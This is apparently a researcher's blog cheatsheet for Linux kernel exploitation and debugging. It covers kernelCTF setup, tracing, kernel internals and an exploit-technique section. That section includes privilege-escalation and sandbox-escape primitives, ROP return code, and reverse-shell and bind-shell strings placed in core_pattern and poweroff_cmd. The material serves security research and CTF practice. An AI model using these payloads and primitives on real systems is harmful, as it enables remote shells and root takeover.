---
layout: post
title:  "Welcome to Jekyll!"
categories: cheatsheet
---

## Linux Kernel

### Resources

- [Interesting Kernel Objects](https://lookerstudio.google.com/u/0/reporting/68b02863-4f5c-4d85-b3c1-992af89c855c/page/n92nD)

- [google/security-research](https://github.com/google/security-research)

- [kernelCTF sheet](https://docs.google.com/spreadsheets/d/e/2PACX-1vS1REdTA29OJftst8xN5B5x8iIUcxuK6bXdzF8G1UXCmRtoNsoQ9MbebdRdFnj6qZ0Yd7LwQfvYC2oF/pubhtml)

- [kernelCTF rules](https://google.github.io/security-research/kernelctf/rules.html)

- [Linux CVE announcement](https://lore.kernel.org/linux-cve-announce/)

### kernelCTF
#### VM setup
``` bash
# 1. Get VM script
https://github.com/google/security-research/blob/88077ea2e1beaa17107cd9d7ee6beb97faa6468e/kernelctf/simulator/local_runner.sh

# 2. Update qemu script
-fsdev local,id=test_dev,path=<PATH_OF_SHARED_FOLDER>,security_model=none \
-device virtio-9p-pci,fsdev=test_dev,mount_tag=test_mount \

# 3. Mount 9pfs
## 3.1 unpack the ramdisk
gunzip ramdisk_v1.img

## 3.2 append the following line to file "/init"
mount -t 9p -o trans=virtio -o version=9p2000.L test_mount ${rootmnt}/chroot/mnt

## 3.3 pack back ramfs cpio
find . -print0 | cpio --null --owner=root -o --format=newc > ../ramdisk_v1.img
```

#### Information
``` bash
# Kernel image (bzImage)
wget https://storage.googleapis.com/kernelctf-build/releases/lts-X.X.X/bzImage

# Kernel image (vmlinux)
wget https://storage.googleapis.com/kernelctf-build/releases/lts-X.X.X/vmlinux.gz

# Kernel config
wget https://storage.googleapis.com/kernelctf-build/releases/lts-X.X.X/.config

# Source code info
## LTS
curl https://storage.googleapis.com/kernelctf-build/releases/lts-X.X.X/COMMIT_INFO
wget https://github.com/gregkh/linux/archive/<COMMIT_HASH>.zip
wget https://github.com/gregkh/linux/archive/$(curl -s https://storage.googleapis.com/kernelctf-build/releases/lts-X.X.X/COMMIT_INFO | sed -n 's/COMMIT_HASH=//p').zip

## COS
curl https://storage.googleapis.com/kernelctf-build/releases/cos-X.X.X/COMMIT_INFO
wget https://cos.googlesource.com/third_party/kernel/+archive/<COMMIT_HASH>.tar.gz
wget https://cos.googlesource.com/third_party/kernel/+archive/$(curl -s https://storage.googleapis.com/kernelctf-build/releases/cos-X.X.X/COMMIT_INFO | sed -n 's/COMMIT_HASH=//p').tar.gz

# Commit info
https://github.com/torvalds/linux/commit/<COMMIT_HASH>
```

### Compilation
``` bash
# compile x64 version kernel on aarch64
make ARCH=x86_64 CROSS_COMPILE=x86_64-linux-gnu- -j`nproc`

# kernel module
make ARCH=x86_64 CROSS_COMPILE=x86_64-linux-gnu- -j`nproc` modules_prepare
```

Makefile of the kernel module `test.c`
``` Makefile
obj-m += test.o

all:
    make ARCH=x86_64 CROSS_COMPILE=x86_64-linux-gnu- -C /<path_to_src> M=$(PWD) modules

clean:
    make ARCH=x86_64 CROSS_COMPILE=x86_64-linux-gnu- -C /<path_to_src> M=$(PWD) clean
```

### Modify Image
``` bash
# 1. DOS/MBR boot sector image (e.g., kernelCTF image)
sudo mount -o loop,offset=1048576 <image_file> rootfs
sudo umount rootfs

# 2. Mount image via dbus on some Linux distributions
## attach image to loop device and mount in /media/<username>/...
udisksctl loop-setup -f <image_file>
## show all loop device
losetup -a 
## unmount
udisksctl unmount -b /dev/loopN
```

### Ubuntu specified version
``` bash
# Ubuntu offical page
https://blueprints.launchpad.net/ubuntu/jammy/amd64/linux-image-5.15.0-69-generic/5.15.0-69.76
https://blueprints.launchpad.net/ubuntu/jammy/amd64/linux-modules-5.15.0-69-generic/5.15.0-69.76

# download image & modules
wget http://launchpadlibrarian.net/656759576/linux-image-5.15.0-69-generic_5.15.0-69.76_amd64.deb
wget http://launchpadlibrarian.net/656414807/linux-modules-5.15.0-69-generic_5.15.0-69.76_amd64.deb

# unpack & install
sudo dpkg -i *.deb

# find the menu entry
sudo awk -F\' '/menuentry / {print $4}' /boot/grub/grub.cfg

# fill the default kernel
sudo vim /etc/default/grub
## if output is "gnulinux-5.15.0-69-generic-advanced-277588d7-7692-4c38-8e63-1b553b7d66b8", set
## GRUB_DEFAULT="gnulinux-advanced-277588d7-7692-4c38-8e63-1b553b7d66b8>gnulinux-5.15.0-69-generic-advanced-277588d7-7692-4c38-8e63-1b553b7d66b"

# update grub
sudo update-grub
```

### Ubuntu (24.04+) Debug

#### Source Code
1. Add the below snippet to the file `/etc/apt/sources.list.d/ubuntu.sources`.
```
Types: deb-src
URIs: http://archive.ubuntu.com/ubuntu/
Suites: noble noble-updates noble-backports noble-proposed
Components: main restricted universe multiverse
Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg
```

2. Update the list of available packages by running `sudo apt update`.

3. Download the kernel source code.

``` bash
sudo apt install dpkg-dev
apt source linux-image-unsigned-$(uname -r)
```

or 

```
http://tw.archive.ubuntu.com/ubuntu/pool/main/l/linux/<linux_6.8.0.orig.tar.gz>
```

#### Debug Image
> Ref: https://ubuntu.com/server/docs/debug-symbol-packages

1. Install the dbgsym keyring.
``` bash
sudo apt install ubuntu-dbgsym-keyring
```

2. Create file `/etc/apt/sources.list.d/ddebs.list` with below content.
```
deb http://ddebs.ubuntu.com noble main restricted universe multiverse
deb http://ddebs.ubuntu.com noble-updates main restricted universe multiverse
deb http://ddebs.ubuntu.com noble-proposed main restricted universe multiverse
```

3. Download the kernel image with debug symbol.
``` bash
apt install linux-image-unsigned-$(uname -r)-dbgsym
```

4. Show debug package information.
``` bash
dpkg-query -L linux-image-unsigned-$(uname -r)-dbgsym
## vmlinux path
/usr/lib/debug/boot/vmlinux-6.8.0-49-generic
## kernel module path
/usr/lib/debug/lib/modules/6.8.0-49-generic/kernel
```

### RHEL (RedHat Enterprise for Linux)

#### Source Code

You may not be able to access the source code of RHEL directly. However, Rocky Linux is fully compatible with RHEL and is an open-source project. Therefore, you can theoretically view the source code through Rocky Linux instead.

The following link is one of the mirrors for Rocky Linux:
https://mirrors.up.pt/rocky/9/BaseOS/source/tree/Packages/k/

``` bash
rpm2cpio kernel-5.14.0-503.40.1.el9_5.src.rpm > tmp.cpio
cpio -i -d < tmp.cpio
ls -al linux-5.14.0-503.40.1.el9_5.tar.xz
```

#### Installation

RedHat provides a no-cost subscription for developers, so you don't need to purchase or subscribe to a license. For more details, please refer to the link below:
https://developers.redhat.com/articles/faqs-no-cost-red-hat-enterprise-linux

#### Others

Update the kernel to the latest:
``` bash
sudo dnf install kernel
```

The kernel module path (RHEL 9.5):
- `/lib/modules/5.14.0-503.XXX.1.el9_5.x86_64`

### Extend Hard Disk on Ubuntu

1. Display disk partitions

```
NAME                      MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
...
sda                         8:0    0   256G  0 disk
├─sda1                      8:1    0     1G  0 part /boot/efi
├─sda2                      8:2    0     2G  0 part /boot
└─sda3                      8:3    0  60.9G  0 part
  └─ubuntu--vg-ubuntu--lv 253:0    0  60.9G  0 lvm  /
...
```

2. Expand partition 3 to allocate the unused disk space

```bash
sudo growpart /dev/sda 3
```

3. Notify LVM (Logical Volume Manager) of the updated partition size

``` bash
sudo pvresize /dev/sda3
```

4. Extend the logical volume

``` bash
sudo lvextend -l +100%FREE /dev/ubuntu-vg/ubuntu-lv
```

5. Resize the filesystem

``` bash
sudo resize2fs /dev/ubuntu-vg/ubuntu-lv
```

### ftrace

``` bash
cat /proc/kallsyms | grep function_name # make sure the function is not inlined

echo \<function_name\> > /sys/kernel/debug/tracing/set_ftrace_filter
echo function > /sys/kernel/debug/tracing/current_tracer
echo 1 > /sys/kernel/debug/tracing/options/func_stack_trace
echo 1 > /sys/kernel/debug/tracing/tracing_on

# ... trigger function
cat /sys/kernel/debug/tracing/trace

# clear output
echo > /sys/kernel/debug/tracing/trace

# turn off
echo 0 > /sys/kernel/debug/tracing/tracing_on
```

on Android

``` bash
echo 0 > /sys/kernel/tracing/tracing_on

chmod 777 /sys/kernel/tracing/options/stacktrace
echo 1 > /sys/kernel/tracing/options/stacktrace

chmod 777 /sys/kernel/tracing/events/kmem/mm_page_alloc/enable
echo 1 > /sys/kernel/tracing/events/kmem/mm_page_alloc/enable

chmod 777 /sys/kernel/tracing/current_tracer
echo 1 > /sys/kernel/tracing/current_tracer

cat /sys/kernel/tracing/trace_pipe
```

### kprobe

``` bash
# Set a return probe (r = return probe) on the function and print its return value
echo 'r:myprobe <function_name> $retval' > /sys/kernel/debug/tracing/kprobe_events
echo 1 > /sys/kernel/debug/tracing/events/kprobes/myprobe/enable
echo 0 > /sys/kernel/debug/tracing/events/kprobes/myprobe/enable

# Set a return probe and print the 64-bit value at an offset of 80 bytes from the return value (used as a pointer)
echo 'r:myprobe <function_name> data_ptr=+80($retval):u64' > /sys/kernel/debug/tracing/kprobe_events
echo 1 > /sys/kernel/debug/tracing/events/kprobes/myprobe/enable
echo 0 > /sys/kernel/debug/tracing/events/kprobes/myprobe/enable

# Set an entry probe (p = probe) on the function and print the third argument
echo 'p:myprobe <function_name> $arg3' > /sys/kernel/debug/tracing/kprobe_events
echo 1 > /sys/kernel/debug/tracing/events/kprobes/myprobe/enable
echo 0 > /sys/kernel/debug/tracing/events/kprobes/myprobe/enable

# Display the trace output and then clear the trace buffer
cat /sys/kernel/debug/tracing/trace
echo > /sys/kernel/debug/tracing/trace
```

### Common Objects Refcount Fields
``` c
// struct file
// refcount++: fdget()
// refcount--: fdput()
file->f_count;

// struct sock
// refcount++: sock_hold()
// refcount--: sock_put()
#define sk_refcnt        __sk_common.skc_refcnt
sk->__sk_common.skc_refcnt;

// struct sk_buff
// refcount++: skb_get()
// refcount--: consume_skb() / kfree_skb() / skb_unref()
skb->users;

// struct mm_struct
// refcount++: mmgrab()
// refcount++: mmdrop()
mm->mm_count;

// struct mm_strucut (user space)
// refcount++: mmget() / mmget_not_zero()
// refcount--: mmput()
mm->mm_users;

// struct pid
// refcount++: get_pid()
// refcount--: put_pid()
pid->count;

// struct task_struct
// refcount++: get_task_struct()
// refcount--: put_task_struct()
t->usage;

// struct cred
// refcount++: get_cred()
// refcount--: put_cred()
cred->usage;

// struct page
// refcount++: try_get_page()
// refcount--: put_page_testzero()
page->_refcount;

// struct ns_common ns (namespace member)
// take time_namespace (struct time_namespace) as example
// refcount++: get_time_ns()
// refcount--: put_time_ns()
ns->ns.count;

// struct nsproxy ns
// refcount++: get_nsproxy()
// refcount--: put_nsproxy()
ns->count;

// struct user_struct
// refcount++: get_uid()
// refcount--: free_uid()
u->__count;

// struct files_struct (current->files)
// refcount++: atomic_inc(&oldf->count)
// refcount--: put_files_struct()
files->count;
```

### Common Objects Lock Functions
``` c
// struct mm_struct
mmap_read_lock(current->mm);
mmap_read_unlock(current->mm);

// struct sock
lock_sock(sk);
release_sock(sk);

// struct files_struct
spin_lock(&files->file_lock);
/* fdt = files_fdtable(files) */
spin_unlock(&files->file_lock);
```

### Socket Structure Architecture

ops

```
(struct net_proto_family) inet_family_ops
             | (create)
             v
(struct proto_ops) inet_stream_ops
             |
             v
(struct proto) tcp_prot
```

object

```
(int) file descriptor
        | (lookup filetable)
        v
(struct file *) file
        | (->private_data)
        v
(struct socket *) sock  -> ops (struct proto_ops)
        | (->sk)
        v
(struct sock *) sk -> sk_prot (struct proto)
```

### Socket Data Operation

A skb object

```
[ head ........ data ........ tail ........ end ]
  ^              ^             ^             ^
  |              |             |             |
  skb->head      skb->data     skb->tail     skb->end
```
- Allocate skb: `skb = sock_alloc_send_skb(sk, headroom + payload_size + tailroom, ...)`
    - Get a skb whose `->head` == `->data` == `->tail`
- headroom: head ~ data
    - Call `skb_reserve(skb, headroom)`
        - Move `->data` and `->tail` with `headroom` size
- payload: data ~ tail
    - Call `void *payload_buf = skb_put(skb, payload_size)`
        - Return pointer pointing to the start address of packet payload
        - Move `->tail` with `payload_size` size
- tailroom: tail ~ end

### virt & page
``` c
#define __START_KERNEL_map (0xffffffff80000000)
extern unsigned long phys_base;        // 0 when nokaslr
extern unsigned long page_offset_base; // 0xffff888000000000 when nokaslr
extern unsigned long vmemmap_base;     // 0xffffea0000000000 when nokaslr

struct page *virt_to_page(unsigned long virt_addr) {
    unsigned long pfn;
  
    if (virt_addr > __START_KERNEL_map)
        pfn = (virt_addr - __START_KERNEL_map + phys_base) >> 12;
    else 
        pfn = (virt_addr - page_offset_base) >> 12;
  
    // sizeof(struct page) == 0x40
    return vmemmap_base + 0x40 * pfn;
}

void *page_to_virt(unsigned long page_addr) {
    unsigned long pfn = (page_addr - vmemmap_base) / 0x40;
    return (pfn << 12UL) + page_offset_base;
}
```

### Exploit
#### Techiques

Pin CPU
- `sched_setaffinity()` or `pthread_setaffinity_np()`

```c
void pin_on_cpu(int cpu_id)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_id, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}
```

KASLR bypass

- Use side channels like [EntryBleed](https://www.willsroot.io/2022/12/entrybleed.html).

- In older versions of Ubuntu, the kernel function `startup_xen` address could be read from `/sys/kernel/notes`. (fixed by CVE-2024-26816)

Auto-reboot after panic or oops

- Set `panic_on_oops=1` and `panic_timeout=1`

Global variable hijacking

- `modprobe_path[]`

    - It will be triggered when attempting to execute an unknown format file.

    - E.g. `modprobe_path[] = "/tmp//modprobe"`

- `core_pattern[]`

    - It will be triggered when an executable causes an SIGSEGV, or zero out `task_struct->mm->pgd` to trigger page fault.

    - E.g. `core_pattern[] = "|/bin/bash -c sh</dev/tcp/ip/port"`

- `poweroff_cmd[]`

    - It won't be triggered basically; you need chain it with other gadgets, such as `tcp_prot.close = &poweroff_work_func`.

    - E.g. `poweroff_cmd[] = "/bin/sh -c /bin/sleep${IFS}10&&/usr/bin/nc${IFS}-lnvp${IFS}13337${IFS}-e${IFS}/bin/bash"`

- `compat_elf_format->load_binary` (last `formats` entry)

    - The rbx will be file content, which allows you to do ROP chain

    - It can be triggered by executing a file with unknown format

Kernel shellcode

- Set kernel address as executable by `set_memory_x(page_aligned_addr, num_of_page)`.

- Leak ktext in shellcode - instruction `rdmsr` with `MSR_LSTAR`. (see `syscall_init()` for more details)

Privilege escalation

- `commit_creds(&init_cred)`

Sandbox escape

- ROP do `switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)`

- Return to userspace and switch to root ns by

    ```c
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);
    ```

Find target task

1. `prctl(PR_SET_NAME)` changes the process name to a unique ID.

2. Start iterating through the `struct task` linked list from `&init_task` and compare each task's name with the unique ID.

Fixed kernel address

- Before Linux v6.1, the kernel address of the CEA (CPU Entry Area) was fixed at `0xfffffe0000000000`, making it possible to place the exploit payload there by triggering an exception.

Bypass error during ROP

- "Illegal context switch in RCU read-side critical section"
    - Set `current->rcu_read_lock_nesting = 0`.

- "BUG: scheduling while atomic: ..."
    - Set `oops_in_progress=1`, making  `__schedule_bug()` return safely.

ROP return to userspace

- Use trampoline `swapgs_restore_regs_and_return_to_usermode()`. (renamed to `common_interrupt_return()` now)

- When executing `iretq`, the stack layout should be (from top to bottom):  rip, cs, rflags, rsp and ss.

- Process calls helper to save state before exploiting.
    ```c
    unsigned long user_cs, user_ss, user_rsp, user_rflags;

    void win()
    {
        execl("/bin/sh", "sh", (char *)NULL);
    }

    void save_state()
    {
        __asm__(
            ".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;"
        );
        /*
        rop[i++] = common_interrupt_return + <offset>; // old name: swapgs_restore_regs_and_return_to_usermode
        
        // [...]
        
        rop[i++] = (unsigned long)win;
        rop[i++] = user_cs;
        rop[i++] = user_rflags;
        rop[i++] = user_rsp & 0xffffffffffffff00;
        rop[i++] = user_ss;
        */
    }
    ```

[Telefork](https://blog.kylebot.net/2022/10/16/CVE-2022-1786/#Telefork-teleport-back-to-userspace-using-fork)

- By using `vfork()` or `sys_fork()` combined with `msleep()`, the new child process is allowed to continue running while the corrupted parent process remains stuck in kernel space.

Pipe object

- [Pipe primitive (DirtyPipe)](https://github.com/veritas501/pipe-primitive) - mark the merge bit `PIPE_BUF_FLAG_CAN_MERGE`.

- [PageJack](https://i.blackhat.com/BH-US-24/Presentations/US24-Qian-PageJack-A-Powerful-Exploit-Technique-With-Page-Level-UAF-Thursday.pdf) - partial overwrite the `struct page *` field.

binfmt

1. Call `__register_binfmt()` to register the corrupted object into the global linked list.

2. Reclaim the object and create a fake `struct linux_binfmt` object.

3. Trigger ROP when analyzing the file format

Extend race window

- make all timerfds wakeup at the same time

    ```c
    int epoll_fd[EPOLL_CNT];
    int tfds[TFDS_CNT];
    int timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
    struct epoll_event event = { .events = 0 };
    struct itimerspec new = {.it_value.tv_nsec = 20};

    for (int i = 0; i < EPOLL_CNT; i++)
        epoll_fd[i] = epoll_create(1);

    for (int i = 0; i < TFDS_CNT; i++)
        tfds[i] = dup(timer_fd);

    for (int j = 0; j < EPOLL_CNT; j++) {
        for (int i = 0; i < TFDS_CNT; i++) {
            event.data.fd = tfds[i];
            epoll_ctl(epoll_fd[j], EPOLL_CTL_ADD, tfds[i], &event);
        }
    }

    timerfd_settime(timer_fd, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
    ```


#### Objects

| struct name      | size          | flags              | new                                          | free          |
| ---------------- | ------------- | ------------------ | -------------------------------------------- | ------------- |
| seq_operations   | 0x20          | GFP_KERNEL_ACCOUNT | shmat                                        | shmdt         |
| shm_file_data    | 0x20          | GFP_KERNEL_ACCOUNT | open "/proc/self/stat"                       | close         |
| msg_msg          | 0x30 ~ 0x1000 | GFP_KERNEL_ACCOUNT | msgsnd                                       | msgrcv        |
| msg_msgseg       | 0x08 ~ 0x1000 | GFP_KERNEL_ACCOUNT | msgsnd (larger than 0x1000 - 0x30)           | msgrcv        |
| user_key_payload | 0x18 ~ 0x7fff | GFP_KERNEL         | add_key                                      | keyctl_unlink |
| pipe_buffer      | 0x280         | GFP_KERNEL_ACCOUNT | pipe                                         | close         |
| timerfd_ctx      | 0xd8          | GFP_KERNEL         | timerfd_create                               | close         |
| tty_struct       | 0x2b8         | GFP_KERNEL_ACCOUNT | open "/dev/ptmx"                             | close         |
| poll_list        | 0x10 ~ 0x1000 | GFP_KERNEL         | poll                                         | close         |
| pg_vec           | pages         | X                  | setsockopt PACKET_VERSION and PACKET_TX_RING | close         |
| sendmsg          | 0x10 ~ 0x5000 | GFP_KERNEL         | sendmsg                                      |               |
| setxattr         | 0x1 ~ 0xffff  | GFP_KERNEL         | setxattr                                     |               |
|                  |               |                    |                                              |               |
| ctl_buf          | 0 ~ 0x5000    | GFP_KERNEL         |                                              |               |
| xdp_umem         | 0x70          |                    |                                              |               |
| netlink_sock     | 0x468         |                    |                                              |               |

Page spraying
> Based on paper "Take a Step Further: Understanding Page Spray in Linux Kernel Exploitation"

| Useful | Function                     | Syscall        |
| ------ | ---------------------------- | -------------- |
|        | `packet_set_ring`            | `setsockopt`   |
|        | `packet_snd`                 | `sendmsg`      |
|        | `packet_mmap`                | `mmap`         |
|        | `rds_message_copy_from_user` | `sendmsg`      |
|     ✅️ | `unix_dgram_sendmsg`         | `sendmsg`      |
|        | `unix_stream_sendmsg`        | `sendmsg`      |
|        | `netlink_sendmsg`            | `sendmsg`      |
|        | `tcp_send_rcvq(inet6)`       | `sendto`       |
|        | `tcp_send_rcvq`              | `sendto`       |
|        | `tun_build_skb`              | `write`        |
|        | `tun_alloc_skb`              | `write`        |
|        | `tap_alloc_skb`              | `write`        |
|     ✅️ | `pipe_write`                 | `write`        |
|        | `fuse_do_ioctl`              | `ioctl`        |
|        | `io_uring_mmap`              | `mmap`         |
|        | `array_map_mmap`             | `mmap`         |
|        | `ringbuf_map_mmap`           | `mmap`         |
|        | `aead_sendmsg`               | `sendmsg`      |
|        | `skcipher_sendmsg`           | `sendmsg`      |
|        | `mptcp_sendmsg`              | `sendmsg`      |
|        | `xsk_mmap`                   | `mmap`         |


Some tricks

- sendmsg - the buffer allocated by sendmsg is released immediately. However, we can leverage `setsockopt(SO_{SND,RCV}BUF)` to fill the send and receive buffer, preventing the buffer from being released.
    ```c
    int n = 0x0;
    int sfd[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, sfd);
    setsockopt(sfd[1], SOL_SOCKET, SO_SNDBUF, (char *)&n, sizeof(n)); // 0x1200 (min sndbuf size)
    setsockopt(sfd[0], SOL_SOCKET, SO_RCVBUF, (char *)&n, sizeof(n)); // 0x0900 (min rcvbuf size)
    write(sfd[1], buf, 0x1181); // hanging
    ```

- pipe_buffer - we can use `fcntl(F_SETPIPE_SZ)` to adjust the size.

- msg_msg - with `MSG_COPY`, we can leak addresses without releasing the object.


#### EoP Cheatsheet

- Get root cred
    - `commit_creds(prepare_kernel_cred(&init_task))`
- Defeat chroot
    - `current->fs = copy_fs_struct(&init_fs)`
- Namespace
    - `switch_task_namespaces(current, &init_nsproxy)`
- SELinux
    - Patch `avc_denied()`

### Features

#### Migitations

| Name                            | Description                                                  |
| ------------------------------- | ------------------------------------------------------------ |
| CONFIG_SLAB_FREELIST_RANDOM | Randomizes the freelist order, making the retrieval order of objects within the same slab unpredictable.|
| CONFIG_SLAB_FREELIST_HARDENED | Provides enhanced security by checking for double free, randomizing the next pointer, and enforcing pointer alignment.<br /><br />Since allocations directly use `c->freelist` for returning objects, if the victim object is at the freelist head, it bypasses `freelist_ptr_{decode,encode}()` and avoids corruption. |
| CONFIG_HARDENED_USERCOPY | Hardens memory copying between the kernel and userspace using `check_object_size()`. For example, `copy_to_user()` cannot copy data exceeding the size of the object. |
| CONFIG_KMALLOC_SPLIT_VARSIZE | Allocates variable-sized objects in **separate caches**.<br /><br />However, it does not prevent UAF if the vulnerable object itself is variable-sized. |
| CONFIG_DEBUG_LIST | Emits a warning when a double unlink is detected but performs no additional actions.|
| CONFIG_RANDOMIZE_BASE | Implements KASLR. |
| CONFIG_SLAB_VIRTUAL | Ensures slab virtual memory is never reused for a different slab. |
| CONFIG_RANDOM_KMALLOC_CACHES | There are multiple generic slab caches for each size, 16 by default. The kenrel selects random slabs based on `_RET_IP_` and a random seed. |
| CONFIG_INIT_STACK_ALL_ZERO | Initializes everything on the stack (including padding) with a zero value. |

#### Capabliliby
`ns_capable()` - creating a new namespace can bypass this check. Common capabilities include `CAP_SYS_ADMIN` (user) or `CAP_NET_ADMIN` (network), etc.

``` c
bool ns_capable(struct user_namespace *ns, int cap)
{
    return ns_capable_common(ns, cap, CAP_OPT_NONE);
}
```

`capable()` - global, and cannot be bypassed using a new namespace.

``` c
bool capable(int cap)
{
    return ns_capable(&init_user_ns, cap);
}
```

#### Preemption

| Name                     | Description                                                  |
| ------------------------ | ------------------------------------------------------------ |
| CONFIG_PREEMPTION        | Configures whether preemption models are enabled.            |
| CONFIG_PREEMPT           | A preemption model where all kernel code is **preemptible**. This option is generally not enabled by default. |
| CONFIG_PREEMPT_VOLUNTARY | Another preemption model where kernel code includes **specific preemption points** that allow rescheduling. |

#### Others

x64 RO data writable

- When `X86_CR0_WP` (write protect) is set, the CPU cannot write to read-only pages when privilege level is 0.

Interrupt disabled / enabled

- `disable_irq()` internally calls `__irq_disable()`, which ultimately executes the `cli` instruction to disable interrupts; enabling interrupts follows a similar path and eventually executes the `sti` instruction.
- Even though `cli` clears the IF (Interrupt Enable) flag, the NMI (Non-Maskable Interrupt), whose interrupt number is 2, can still be triggered.

Buddy system

- page from SLUB: **`MIGRATE_UNMOVABLE`**
    ``` c
    static struct slab *allocate_slab(struct kmem_cache *s, gfp_t flags, int node)
    {
        alloc_gfp = (flags | __GFP_NOWARN | __GFP_NORETRY) & ~__GFP_NOFAIL;
        // [...]
        slab = alloc_slab_page(alloc_gfp, node, oo);
        // [...]
    }
    ```
    - P.S. SLUB metadata is stored in `struct slab`, which is an union struct with `struct page`
- page from pipe: **`MIGRATE_UNMOVABLE`**
    ``` c
    static ssize_t
    pipe_write(struct kiocb *iocb, struct iov_iter *from)
    {
        // [...]
        if (!page) {
            page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
        }
        // [...]
    }
    ```
- page from anonymous page: **`MIGRATE_MOVABLE`**
    ```c
    #define vma_alloc_zeroed_movable_folio(vma, vaddr) \
        vma_alloc_folio(GFP_HIGHUSER_MOVABLE | __GFP_ZERO, 0, vma, vaddr, false)

    static vm_fault_t do_anonymous_page(struct vm_fault *vmf)
    {
        // [...]
        folio = vma_alloc_zeroed_movable_folio(vma, vmf->address);
        if (!folio)
            goto oom;
        // [...]
    }
    ```
- page from aio ring buffer: **`MIGRATE_UNMOVABLE`**
    ``` c
    static int aio_setup_ring(struct kioctx *ctx, unsigned int nr_events)
    {
        // [...]
        for (i = 0; i < nr_pages; i++) {
            struct page *page;
            page = find_or_create_page(file->f_mapping,
                        i, GFP_USER | __GFP_ZERO);
        }
        // [...]
    }
    ```

Linked List Operation

- `list_init(struct list_head *entry)`
    ``` c
    entry->next = entry;
    entry->prev = entry;
    ```

- `list_add(struct list_head *new, struct list_head *head)`
    ``` c
    new->next = head->next;
    new->prev = head;
    head->next->prev = new;
    head->next = new;
    ```

- `list_del(struct list_head *entry)`
    ``` c
    entry->prev->next = entry->next;
    entry->next->prev = entry->prev;
    ```

- `list_del_init(struct list_head *entry)`
    ``` c
    entry->prev->next = entry->next;
    entry->next->prev = entry->prev;
    entry->next = entry;
    entry->prev = entry;
    ```

- `list_move(struct list_head *entry, struct list_head *head)`
    ``` c
    entry->prev->next = entry->next;
    entry->next->prev = entry->prev;

    entry->next = head->next;
    entry->prev = head;
    head->next->prev = entry;
    head->next = entry;
    ```

- `list_empty(struct list_head *head)`
    ``` c
    return (head->next == head);
    ```

- `list_first_entry(type, head, member)`
    ``` c
    container_of(head->next, type, member);
    ```

- `list_for_each_entry(pos, head, member)`
    ``` c
    for (pos = container_of((head)->next, typeof(*pos), member);
        &pos->member != (head);
        pos = container_of(pos->member.next, typeof(*pos), member))
    ```

- `list_for_each_entry_safe(pos, n, head, member)`
    ``` c
    for (pos = container_of((head)->next, typeof(*pos), member),
        n = container_of(pos->member.next, typeof(*pos), member);
        &pos->member != (head);
        pos = n, n = container_of(n->member.next, typeof(*n), member))
    ```

Real Mode Interrupt Vector Table (IVT)

- The physical memory address range **0x0000 ~ 0x0FFF** is reserved for the Interrupt Vector Table (IVT) in x86 real mode.
- The IVT contains 256 entries, each 4 bytes in size.
- Each entry consists of a 16-bit offset and a 16-bit segment, forming a far pointer to the interrupt handler.
- Example:
    - INT 0 retrieves its handler address from *(uint32_t *)0, i.e., offset 0.
    - Suppose memory at 0x0000 contains: **0x53 0xFF 0x00 0xF0**
    - This corresponds to: offset = 0xFF53, segment = 0xF000
    - Actual address executed:
        - physical_address = (segment << 4) + offset = 0xFFF53

Common VMA Flags Explained

| Flag            | Definition                                                                                                              | Others                                               |
| --------------- | ----------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| `VM_PFNMAP`     | Indicates the VMA maps physical page frames directly (not regular anonymous or file-backed memory).                     | Use `remap_pfn_range()` instead of `vm_insert_pfn()` |
| `VM_MAYWRITE`   | Marks the VMA as potentially writable.                                                                                  | `mmap(PROT_WRITE)` but later `mprotect(PROT_READ)`   |
| `VM_DONTEXPAND` | Prevents the VMA from being automatically expanded.                                                                     | `brk()` or `mmap(VM_GROWSDOWN)`                      |
| `VM_IO`         | Indicates the VMA is used for memory-mapped I/O (MMIO). The kernel avoids **swapping** or direct access to these pages. |                                                      |
| `VM_DONTCOPY`   | Prevents this VMA from being duplicated during a `fork()`.                                                              | `fork()`                                             |

Common VMA Operations and Their Triggers

| Operations | Triggered by                                                                 |
| ---------- | ---------------------------------------------------------------------------- |
| `.open`    | When a new VMA is created or split — e.g., `madvise()`, `fork()`, `munmap()` |
| `.close`   | When a VMA is destroyed — e.g., `munmap()`, process exit                     |
| `.mremap`  | Directly triggered by `mremap()` system call                                 |
| `.fault`   | page fault (e.g., memory access to an unmapped or lazy area)                 |

## Debug
``` bash
gdb-multiarch ./vmlinux -ex "target remote :1234"

## handle KASLR
symbol-file ./vmlinux -o <offset> # _stext - 0xffffffff81000000
```

### GDB Stubs
``` bash
# breakpoint at specific syscall
b __do_sys_<SYSCALL_NAME>

# breakpoint at syscall entry
b entry_SYSCALL_64

# show which slab the address belong to
slab contains 0xffff888104b2b2a0
## output: 0xffff888104b2b2a0 @ kmalloc-96

# show slab info
slab info kmalloc-96

# show page tables
pt
```

gdb displays assembly code based only on rip, but in the real mode, actual execution address should be:

```
address = (cs << 4) + rip
```

### pahole

``` bash
pahole -s ./vmlinux | grep -P "\t<size>\t"
pahole -C <struct_name> ./vmlinux
```

## Android Debug Environment

### Host

Install adb on MacOS

``` bash
brew install android-platform-tools
```

Some helpful commands:

``` bash
# list device
adb devices

# push binary
adb push my_binary /data/local/tmp/

# get shell
adb shell

# get log
adb -s <device_id> logcat -b all

##### for bug report #####
# kernel release
uname -r

# get fingerprint
adb shell getprop ro.build.fingerprint

# Android version
adb shell getprop ro.build.version.release

# security patch time
adb shell getprop ro.build.version.security_patch
```

`scrcpy`: mirror screen to the host

``` bash
# install
brew install scrcpy

# run (with device connected)
scrcpy
```

SELinux

``` bash
# show the SELinux context of a file
ls -Z /path/to/file

# download policy to local
adb pull /sys/fs/selinux/policy ./policy

# allow rule for source(domain) untrusted_app
sesearch --allow -s untrusted_app ./policy

# allow rule to target "wm_trace_data_file" for source(domain) system_server
sesearch --allow -s system_server -t wm_trace_data_file ./policy

